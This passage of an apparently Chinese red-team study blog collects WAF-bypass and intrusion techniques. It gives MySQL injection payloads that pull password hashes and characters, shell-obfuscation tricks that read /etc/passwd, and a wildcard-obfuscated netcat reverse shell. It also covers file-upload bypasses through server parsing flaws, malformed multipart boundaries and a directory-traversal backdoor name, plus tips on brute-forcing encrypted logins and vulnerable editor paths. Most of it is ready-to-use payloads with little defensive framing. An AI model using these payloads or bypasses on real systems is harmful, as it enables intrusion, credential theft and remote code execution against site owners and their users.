powershell">?key=wo<span class="hljs-string">&#x27;+&#x27;</span><span class="hljs-built_in">rd</span>?key=wo<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-built_in">rd</span>?key=wo<span class="hljs-string">&#x27; &#x27;</span><span class="hljs-built_in">rd</span></code></pre><hr><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=ord(<span class="hljs-string">&#x27;a&#x27;</span>)=<span class="hljs-number">97</span> <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>+AND+<span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>+&amp;&amp;+<span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">?id</span>=<span class="hljs-string">&#x27;=’</span><span class="hljs-string">?id=123+AND+md5(‘a’)!= md5(‘A’) </span><span class="hljs-string">?id=123+and+len(@@version)&gt;1 </span><span class="hljs-string">?id=1’||1=’1 </span><span class="hljs-string">?id=123‘+like+&#x27;</span><span class="hljs-number">123</span> <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span><span class="hljs-string">&#x27;+not+like+&#x27;</span><span class="hljs-number">1234</span> <span class="hljs-built_in">?id</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>&lt;&gt;<span class="hljs-string">&#x27;bbb&#x27;</span><span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>/*! <span class="hljs-keyword">union</span> all select version() */-- <span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>/*!<span class="hljs-keyword">or</span>*/<span class="hljs-number">1</span>=<span class="hljs-number">1</span>; <span class="hljs-built_in">?id</span>=(<span class="hljs-number">1</span>)<span class="hljs-keyword">union</span>(((((((select(<span class="hljs-number">1</span>), hex(hash)from(users))))))))       ---<span class="hljs-number">7</span>个+<span class="hljs-number">8</span>个括号 <span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>+<span class="hljs-keyword">union</span>+(select’<span class="hljs-number">1</span>‘<span class="hljs-built_in">,concat</span>(login,hash)from+users) <span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>+<span class="hljs-meta">%55nion</span>(<span class="hljs-meta">%53elect</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)-- -<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>/*!<span class="hljs-number">000000</span><span class="hljs-keyword">union</span>*/select<span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span>/*asdas/asd asasd*/version() <span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span>(select<span class="hljs-meta">%0aall</span>&#123;x users&#125;from&#123;x ddd&#125;)</code></pre><p><strong>Mysql常用函数</strong><br>字符串处理：</p><pre><code class="hljs routeros">?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=<span class="hljs-string">&#x27;*&#x27;</span>?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=0x2a?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=unhex(<span class="hljs-string">&#x27;2a&#x27;</span>) ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) regexp <span class="hljs-string">&#x27;[*]&#x27;</span>?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) like <span class="hljs-string">&#x27;*&#x27;</span> ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) rlike <span class="hljs-string">&#x27;[*]&#x27;</span>?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> ord(mid(password,1,1))=42 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> ascii(mid(password,1,1))=42 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> find_in_set(<span class="hljs-string">&#x27;2a&#x27;</span>,hex(mid(password,1,1)))=1?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> position(0x2a <span class="hljs-keyword">in</span> password)=1?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> locate(ox2a,password)=1?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> substring((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> substr((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0X69) = 1 ?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0×70) = 0?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0x71) = -1</code></pre><hr><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><strong>‘ （单引号）以及 \ （反斜杠）绕过</strong></p><pre><code class="hljs groovy">$ echo orleven orleven$ echo o<span class="hljs-string">&#x27;r&#x27;</span>l<span class="hljs-string">&#x27;e&#x27;</span>v<span class="hljs-string">&#x27;e&#x27;</span>n<span class="hljs-string">&#x27;&#x27;</span>oreven $ <span class="hljs-regexp">/b&#x27;i&#x27;n/</span>c<span class="hljs-string">&#x27;a&#x27;</span>t <span class="hljs-regexp">/e&#x27;t&#x27;c/</span>p<span class="hljs-string">&#x27;a&#x27;</span>s<span class="hljs-string">&#x27;s&#x27;</span>w<span class="hljs-string">&#x27;d&#x27;</span> <span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root:/</span>bin/bash <span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin <span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span><span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin $ <span class="hljs-regexp">/b\i\n/</span>c\at <span class="hljs-regexp">/et&#x27;c&#x27;/</span>pa<span class="hljs-string">&#x27;s&#x27;</span>swd <span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root: /</span>bin/bash <span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin <span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span><span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin</code></pre><hr><p><strong>? 、 * 、 [、 ]、 ^、 - 通配符绕过</strong></p><p>问号最好只匹配到唯一一条</p><pre><code class="hljs gradle">$ <span class="hljs-regexp">/b??/</span>c?t <span class="hljs-regexp">/etc/</span>??ss?droot: X: <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: root: <span class="hljs-regexp">/root: /</span>bin/bash daemon: x: <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: daemon: <span class="hljs-regexp">/usr/</span>sbin: <span class="hljs-regexp">/usr/</span>sbin/nologin bin: X: <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: bin:<span class="hljs-regexp">/bin: /u</span>sr<span class="hljs-regexp">/sbin/</span>nologin $ <span class="hljs-regexp">/???/</span>n? -e <span class="hljs-regexp">/???/</span>b??h <span class="hljs-number">2130706433</span> <span class="hljs-number">1337</span> # <span class="hljs-regexp">/bin/</span>nc -e <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1337</span></code></pre><hr><p><strong>$ 不存在的符号</strong></p><pre><code class="hljs groovy">cat $u<span class="hljs-regexp">/etc$u/</span>passwd$u <span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root: /</span>bin/bash <span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin <span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span> <span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin</code></pre><p><strong>; 分号执行</strong></p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cat /etc/passwd;ls .......<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110:115</span><span class="hljs-symbol">:MySQL</span> Serve,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span> a.out go gobuster gopath soft sqlmap.log tool</code></pre><hr><h4 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h4><p><strong>文件名绕过</strong></p><pre><code class="hljs perl"><span class="hljs-number">1</span>）文件名加回车<span class="hljs-number">2</span>）shell.php(%80-%99).jpg 绕过<span class="hljs-number">3</span>）如果有改名功能，可先上传正常文件，再改名 <span class="hljs-number">4</span>）%00<span class="hljs-number">5</span>）<span class="hljs-number">00</span>(<span class="hljs-keyword">hex</span>)<span class="hljs-number">6</span>）长文件名（windows <span class="hljs-number">258</span>byte | linux <span class="hljs-number">4096</span>byte ），可使用非字母数字，比如中文等最大程度的拉长。 <span class="hljs-number">7</span>）重命名</code></pre><p><strong>脚本后缀</strong></p><pre><code class="hljs awk">Php<span class="hljs-regexp">/php3/</span>php<span class="hljs-regexp">/php5/</span>php6<span class="hljs-regexp">/pht/</span>phpt/phtml asp<span class="hljs-regexp">/cer/</span>asa<span class="hljs-regexp">/cdx/</span>aspx<span class="hljs-regexp">/ashx/</span>ascx/asax jsp<span class="hljs-regexp">/jspx/i</span>spf</code></pre><p><strong>解析漏洞</strong></p><p>服务器特性:<br>1.会将Request中的不能编码部分的%去掉<br>2.Request中如果有unicode部分会将其进行解码</p><p><strong>IIS</strong></p><p>lIS6.0两个解析缺陷：目录名包含<code>.asp</code>、<code>.asa</code>、<code>.cer</code>的话，则该目录下的所有文件都将按照asp解析</p><p>例如:</p><p><code>/abc.asp/1.jpg</code> 会当做<code> /abc.asp</code> 进行解析<br><code>/abc.php/1.jpg</code> 会当做 <code>/abc.php</code> 进行解析</p><p><strong>Apache1.X 2.X解析漏洞</strong></p><p>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止</p><p><strong>Nginx</strong></p><p>以下Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell. jpg，然后以shell.j pg.php进行请求</p><pre><code class="hljs markdown">• Nginx 0.5.<span class="hljs-emphasis">*</span><span class="hljs-emphasis">• Nginx 0.6.*</span>• Nginx 0.7 &lt;= 0.7.65• Nginx 0.8 &lt;= 0.8.37</code></pre><p>以上Nginx容器器的版本下，上传⼀个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p><pre><code class="hljs plain">• Nginx 0.8.41 – 1.5.6：</code></pre><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p><p><strong>PHP CGI 解析漏洞</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">IIS</span> <span class="hljs-number">7</span>.<span class="hljs-number">0</span>/<span class="hljs-number">7</span>.<span class="hljs-number">5</span><span class="hljs-attribute">Nginx</span> &lt; <span class="hljs-number">0</span>.<span class="hljs-number">8</span>.<span class="hljs-number">3</span></code></pre><p>以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">337</span></code></pre><p><strong>系统特性：利用NTFS ADS特性</strong></p><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过</p><pre><code class="hljs stata"><span class="hljs-keyword">test</span>.asp.<span class="hljs-keyword">test</span>.asp(空格)<span class="hljs-keyword">test</span>.php:1.jpg<span class="hljs-keyword">test</span>.php: <span class="hljs-variable">$DATA</span><span class="hljs-keyword">test</span>.php_</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/08.png" alt="系统特性"><br>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/1189">https://xz.aliyun.com/t/1189</a></li></ul><hr><p><strong>协议解析不一致，绕过waf（注入跨站也可尝试）</strong></p><p>因为这种不仅仅存在于上传之处，注入跨站也可尝试</p><p><strong>垃圾数据</strong></p><pre><code class="hljs php">-------------WebkitFormBoundaryFADasdasdasDdasdContent-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>, filename=<span class="hljs-string">&#x27;abc.php&#x27;</span>;aaaaaaaaaaaaaaaa Content-Type: application/octet-stream；<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>-------------WebkitFormBoundaryFADasdasdasDdasd</code></pre><hr><p><strong>文件类型绕过/Header 头类型</strong></p><p>修改文件类型绕过<code>/Header</code>头的<code>Content-Type</code>，多次尝试:</p><pre><code class="hljs fortran">Content-<span class="hljs-keyword">Type</span>：application/x-www-<span class="hljs-keyword">form</span>-urlencoded；Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>； Content-<span class="hljs-keyword">Type</span>：application/octet-stream；</code></pre><p><strong>文件名解析兼容性</strong></p><p>利用<code>filename</code>兼容性，多次修改常识<code>Content-Disposition</code>，多次尝试:</p><pre><code class="hljs routeros">Content-Disposition：form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=bc.phpContent-Disposition：form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;bc.php</span><span class="hljs-string">Content-Disposition：form-data; name=&quot;</span>file&quot;; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;bc.php&#x27;</span></code></pre><p><strong>未解析所有文件</strong></p><p><code>multipart协议</code>中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_32393893/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81625047</span></code></pre><p><strong>不规则Content-Disposition文件名覆盖</strong></p><pre><code class="hljs http">-------------WebkitFormBoundaryFADasdasdasDdasdcontent-Dispositiona：form-data; name=&quot;file&quot;; filename=&#x27;abc.jpg&#x27; Content-Disposition：form-data; name=&quot;file&quot;; filename=abc.php&#x27;<span class="hljs-attribute">Content-Type</span>: application/octet-stream; &lt;?php phpinfo(); ?&gt;-------------WebkitFormBoundaryFADasdasdasDdasd</code></pre><ul><li><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700">https://weibo.com/ttarticle/p/show?id=2309404007261092631700</a></li></ul><p>文章讲解了Content-Disposition各种不规则绕过方法</p><hr><p><strong>boundary 绕过</strong></p><p>boundary边界不一致(Win2k3 + llS6.0 + ASP)</p><pre><code class="hljs llvm"><span class="hljs-number">1</span>）<span class="hljs-variable">%u</span>特性: iis支持对unicode的解析，如:payload为[s<span class="hljs-variable">%u006c</span><span class="hljs-variable">%u0006ect</span>]<span class="hljs-punctuation">,</span>解析出来后则是[<span class="hljs-keyword">select</span>]     <span class="hljs-variable">%u0061nd</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>    另类<span class="hljs-variable">%u</span>特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现:多个widechar可能会转换为同一个字符。    如：<span class="hljs-keyword">select</span>中的e对应的unicode为<span class="hljs-variable">%u0065</span>，但是<span class="hljs-variable">%u00f0</span>同样会被转换成为e s<span class="hljs-variable">%u00f0lect</span>    iis+asp    <span class="hljs-number">2</span>）%特性: union selec<span class="hljs-variable">%t</span> user fr<span class="hljs-variable">%om</span> dd #iis+asp asp+iis环境下会忽略掉百分号，如：payload为[sele<span class="hljs-variable">%ct</span>]<span class="hljs-punctuation">,</span> 解析出来后则是[<span class="hljs-keyword">select</span>]    <span class="hljs-number">3</span>）asp/asp.net在解析请求的时候，允许Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded的数据提交方式<span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>user        asp/asp.net request解析:<span class="hljs-number">4</span>）在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-<span class="hljs-keyword">type</span><span class="hljs-punctuation">,</span> 换一种理解方式也就是将原本的post数据包的method改成GET<span class="hljs-punctuation">,</span>如果使用request(‘id’)方式获取数据，仍会获取到post的内容</code></pre><p><strong>php+apache畸形的boundary</strong></p><p>php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS</p><pre><code class="hljs vhdl">Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">------,xxxx</span>    Content-Length: <span class="hljs-number">191</span>    <span class="hljs-comment">------,xxxx</span>    Content-Disposition: form-data; name=<span class="hljs-string">&quot;img&quot;</span>; filename=<span class="hljs-string">&quot;img.gif&quot;</span>    GIF89a    <span class="hljs-comment">------</span>    Content-Disposition: form-data; name=<span class="hljs-string">&quot;id&quot;</span>    <span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,flag,<span class="hljs-keyword">null</span> from flag limit <span class="hljs-number">1</span> offset <span class="hljs-number">1</span><span class="hljs-comment">-- -</span>    <span class="hljs-comment">--------</span>    <span class="hljs-comment">------,xxxx--</span><span class="hljs-number">12345678910111213</span></code></pre><p><strong>畸形method(header头中)</strong></p><p>某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。如请求的method名为DOTA，依然会返回GET方法的值，即,可以任意替换GET方法为其它值，但仍能有效工作，但如果waf严格按照GET方法取值，则取不到任何内容</p><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2418</span></code></pre><p>…….</p><p>等等骚姿势，后续慢慢添加</p><hr><h3 id="登录口JS前端加密绕过"><a href="#登录口JS前端加密绕过" class="headerlink" title="登录口JS前端加密绕过"></a>登录口JS前端加密绕过</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h4><p>渗透测试过程中遇到web登录的时候，现在很多场景账号密码都是经过js加密之后再请求发送（通过抓包可以看到加密信息）如图一burp抓到的包,request的post的登录包，很明显可以看到password参数的值是经过前端加密之后再进行传输的，遇到这种情况,普通发包的爆破脚本就很难爆破成功。鉴于这种情况,这边分析四种方式进行绕过加密爆破</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/09.png" alt="参数值被加密"></p><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a><strong>参考文章：</strong></h4><p>大概能分为以下四种方法</p><ul><li><a href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></li></ul><h4 id="简述"><a href="#简述" class="headerlink" title="简述:"></a><strong>简述:</strong></h4><p>1）既然是前端s加密，代码我们都能看得到，我们搭个服务器，每次发包前，把要发送的加密参数用服务器加密一遍，我们再把加密后的参数发送过去，这样相当于本地还原了加密过程</p><p>2）利用selenium webdriver等完全模拟人工输入，字典也可以自定义，不过需要自己写脚本而已,这种方法比较万能</p><p>3）这种方法适合有js功底的同学，首先把他的js加密过程跟方法看懂，然后本地简化或者用其他语言模拟他的加密过程，再自己写脚本去跑，或者生成加密后的字典直接burp去跑即可</p><p>4）前人栽树，后人乘凉，cony1老哥为了方便后辈，写了一款burp插件， <code>https://github.com/c0ny1/jsENcrypter</code>，名为jsEncrypter，简单来说就是把1，3点结合了一下，用插件方便地跑起来</p><h4 id="jsEncrypter安装与本地测试"><a href="#jsEncrypter安装与本地测试" class="headerlink" title="jsEncrypter安装与本地测试"></a>jsEncrypter安装与本地测试</h4><p>这里重点介绍第四种方法</p><p>1）首先得安装 maven，mac下直接 brew install maven<br>安装连接：</p><ul><li><a href="https://www.runoob.com/maven/maven-setup.html">https://www.runoob.com/maven/maven-setup.html</a></li></ul><p>按照文档三种系统都有安装方法</p><p>2）安装好maven后，把jsEncrypter git clone回来或者下载回来解压缩，然后在他的文件夹下，打开cmd窗口，然后运行mvn package，就可以把插件编译成型，编译好后会多出一个target文件夹<br>命令：<code>mvn package</code></p><p>这里不演示下去了…详细的查看文章…</p><ul><li><a href="https://fucker-shamo.github.io/2019/08/04/%E7%99%BB%E9%99%86%E5%8F%A3js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%BB%95%E8%BF%87/">https://fucker-shamo.github.io/2019/08/04/登陆口js前端加密绕过/</a></li></ul><p>中间复现会遇到的一些问题：<br>安装phantomJS环境变量参考：<a href="https://blog.csdn.net/xc_zhou/article/details/80700640">https://blog.csdn.net/xc_zhou/article/details/80700640</a></p><p>参考链接：</p><ul><li><a href="http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></li><li><a href="https://www.freebuf.com/articles/web/184455.html">https://www.freebuf.com/articles/web/184455.html</a></li><li><a href="https://bbs.ichunqiu.com/thread-42457-1-3.html">https://bbs.ichunqiu.com/thread-42457-1-3.html</a></li><li><a href="http://gv7.me/articles/2017/jsEncrypter/">http://gv7.me/articles/2017/jsEncrypter/</a></li><li><a href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/9158988.html">https://www.cnblogs.com/xiaozi/p/9158988.html</a></li></ul><hr><h3 id="XMLDecoder-标签、POC"><a href="#XMLDecoder-标签、POC" class="headerlink" title="XMLDecoder 标签、POC"></a>XMLDecoder 标签、POC</h3><p><strong>标签类型：</strong><br>1）java<br>2）array<br>3）class<br>4）object<br>5）void<br>6）new<br>7）field<br>8）method<br>9）property<br>10）byte<br>11）其余数据类型</p><p><strong>XML的基本语法</strong><br><strong>XML简单利用</strong></p><p>详细文章：</p><ul><li><a href="https://xz.aliyun.com/t/7944">https://xz.aliyun.com/t/7944</a></li></ul><p>该文章全面的介绍了XMLDecoder遇到的基础知识…了解后我们开始看下面的CVE解析文章</p><ul><li><a href="http://xxlegend.com/tags/XMLDecoder/">http://xxlegend.com/tags/XMLDecoder/</a>    –CVE-2019-2725、Weblogic XMLDecoder RCE分析</li><li><a href="https://payloads.info/2020/07/01/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-XMLDecoder%E5%88%B0Weblogic%E5%87%A0%E4%B8%AA%E8%A1%A5%E4%B8%81%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://payloads.info/2020/07/01/Java安全-反序列化篇-XMLDecoder到Weblogic几个补丁的绕过分析/</a>  </li></ul><p>文章非常详细的POC</p><hr><h3 id="phpMyAdmin去getshell"><a href="#phpMyAdmin去getshell" class="headerlink" title="phpMyAdmin去getshell"></a>phpMyAdmin去getshell</h3><p><strong>前言</strong></p><p>在学习sql语句之前，拿到phpmyadmin弱口令登录到后台却不知道怎么利用，学习之后却有了新的想法利用phpMyadmin getshello接下去来验证自己的猜想</p><p><strong>phpMyAdmin的简介</strong><br>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p><p>详细文章：</p><ul><li><a href="https://xz.aliyun.com/t/3283">https://xz.aliyun.com/t/3283</a></li><li><a href="https://my.oschina.net/u/4196756/blog/4408564">https://my.oschina.net/u/4196756/blog/4408564</a>   –近期最新文章复现讲解</li><li><a href="https://zhuanlan.zhihu.com/p/25957366">https://zhuanlan.zhihu.com/p/25957366</a></li></ul><hr><h3 id="攻击JWT的一些方法"><a href="#攻击JWT的一些方法" class="headerlink" title="攻击JWT的一些方法"></a>攻击JWT的一些方法</h3><p>详细文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6776</span></code></pre><p>该文章中REF有详细链接，以及针对JWT的爆破密匙工具c-jwt-cracker也有详细链接介绍等</p><hr><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><h4 id="上传技巧"><a href="#上传技巧" class="headerlink" title="上传技巧"></a>上传技巧</h4><pre><code class="hljs tap">大小写混淆%00截断 上传.htaccess分布式部署文件 图片文件头：47<span class="hljs-number"> 49 </span>46<span class="hljs-number"> 38 </span>39<span class="hljs-number"> 61 </span>(gif)、FF D8 FF E0<span class="hljs-number"> 00 </span>10 4A<span class="hljs-number"> 46 </span>49<span class="hljs-number"> 46 </span>(jpg) 、89<span class="hljs-number"> 50 </span>4E<span class="hljs-number"> 47 </span>(png) 其他解析格式：cer、asa、php4、php3、php5、phtml、jspx修改（Content-type）MIME 目录回溯符 filename=&quot;../backdoor. php&quot;</code></pre><hr><h4 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a><strong>编辑器漏洞</strong></h4><h5 id="百度编辑器-Ueditor"><a href="#百度编辑器-Ueditor" class="headerlink" title="百度编辑器 Ueditor"></a><strong>百度编辑器 Ueditor</strong></h5><pre><code class="hljs routeros">controller.ashx?<span class="hljs-attribute">action</span>=catchimage</code></pre><h5 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a><strong>FCKeditor</strong></h5><p><strong>查看版本</strong></p><pre><code class="hljs awk"><span class="hljs-regexp">/fckeditor/</span>editor<span class="hljs-regexp">/dialog/</span>fck_about.html<span class="hljs-regexp">/fckeditor/</span>_Whatsnew.html</code></pre><p><strong>上传页面</strong></p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?type=Image&amp;connector=connectors/</span>asp/connector.aspFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span 